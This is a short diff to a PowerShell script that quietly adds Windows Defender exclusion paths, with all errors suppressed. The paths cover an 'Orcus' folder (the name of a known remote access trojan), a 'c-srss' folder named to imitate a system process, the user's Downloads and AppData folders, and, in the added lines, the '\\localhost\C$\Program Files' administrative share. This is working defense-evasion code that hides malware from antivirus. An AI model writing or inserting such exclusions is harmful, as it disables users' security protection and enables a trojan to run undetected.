@@ -40,11 +40,13 @@ $orcusPath = "C:\Program Files\Orcus"
 $downloadsPath = "$env:USERPROFILE\Downloads"
 $appDataPath = "$env:USERPROFILE\AppData"
 $orcusPath2 = "C:\Program Files\c-srss"
+$localhostPath = "\\localhost\C$\Program Files"
 try {
     Add-MpPreference -ExclusionPath $orcusPath -ErrorAction SilentlyContinue | Out-Null
     Add-MpPreference -ExclusionPath $downloadsPath -ErrorAction SilentlyContinue | Out-Null
     Add-MpPreference -ExclusionPath $appDataPath -ErrorAction SilentlyContinue | Out-Null
     Add-MpPreference -ExclusionPath $orcusPath2 -ErrorAction SilentlyContinue | Out-Null
+    Add-MpPreference -ExclusionPath $localhostPath -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
 Show-Header
